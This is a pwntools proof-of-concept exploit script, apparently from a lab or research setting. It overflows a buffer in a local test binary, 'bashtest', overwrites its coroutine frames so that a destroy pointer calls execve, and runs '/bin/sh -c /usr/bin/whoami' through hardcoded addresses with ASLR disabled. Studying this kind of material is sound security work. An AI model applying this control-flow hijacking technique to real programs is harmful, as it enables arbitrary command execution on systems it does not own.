from pwn import *

context.update(arch='x86_64', os='linux')
context.aslr = False
binary = ELF('./bashtest')
context.binary = binary
#context.terminal = ['bash', '-e']
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = gdb.debug('./bashtest', '''
    b destroy
    c        
''')

BASH_ARG_PTR_PTR = 0x55555556c7a8
BASH_ARG0_PTR = 0x55555556c7c8
BASH_ARG1_PTR = 0x55555556c7d0
BASH_ARG2_PTR = 0x55555556c7d8
BASH_ARG0_CONTENT = 0x0068732f6e69622f
BASH_ARG1_CONTENT = 0x00632d
BASH_ARG2_CONTENT_1 = 0x6e69622f7273752f
BASH_ARG2_CONTENT_2 = 0x00696d616f68772f
BASH_RSI = BASH_ARG_PTR_PTR
BASH_RDX = 0x0
BASH_RCX = 0x3
EXECVE_FUNC = 0x7ffff78eb070

SIMPLEARGUMENTSFUNCTION_PTR = 0x555555556180
VULN_PTR = 0x55555556c2b0
FOO_FRAME_PTR = 0x55555556c720
LOL_FRAME_PTR = 0x55555556c760
BAR_FRAME_RESUME_PTR = BASH_ARG0_CONTENT # hijacked arg0
FOO_FRAME_RESUME_PTR = 0x0000555555555a00
LOL_FRAME_RESUME_PTR = 0x00005555555556f0
BAR_FRAME_DESTROY_PTR = EXECVE_FUNC # address of function to call
FOO_FRAME_DESTROY_PTR = 0x0000555555555c60
LOL_FRAME_DESTROY_PTR = 0x00005555555559f0


initial_overflow_payload = b'A'*1072

overwrite_payload = \
    pack(BAR_FRAME_RESUME_PTR) + pack(BAR_FRAME_DESTROY_PTR) +\
    p64(0) + p64(2) + \
    p64(0) + p64(FOO_FRAME_PTR) +\
    p64(0) + p64(41) +\
    pack(SIMPLEARGUMENTSFUNCTION_PTR) + pack(BASH_ARG_PTR_PTR) +\
    p64(0) + p64(2) + \
    p64(0) + p64(LOL_FRAME_PTR) +\
    p64(0) + p64(31) +\
    pack(LOL_FRAME_RESUME_PTR) + pack(LOL_FRAME_DESTROY_PTR) +\
    pack(FOO_FRAME_PTR) + pack(VULN_PTR)

#1136
payload_class_data = b'B'*0x10 + \
    p64(BASH_RCX) + p64(BASH_RSI) +  p64(BASH_RDX) 

payload_bash_data = pack(BASH_ARG0_PTR) + pack(BASH_ARG1_PTR) + pack(BASH_ARG2_PTR) + p64(0x0) + \
    pack(BASH_ARG0_CONTENT) + pack(BASH_ARG1_CONTENT) + pack(BASH_ARG2_CONTENT_1) + pack(BASH_ARG2_CONTENT_2)

p.recvuntil("inside lol()\n")
payload = initial_overflow_payload + overwrite_payload + payload_class_data + payload_bash_data
#payload = payload_class_data
log.info("Overflowing coroutine frames... payload size: "+str(len(payload)))
p.sendline(payload)

print(payload)


p.interactive()
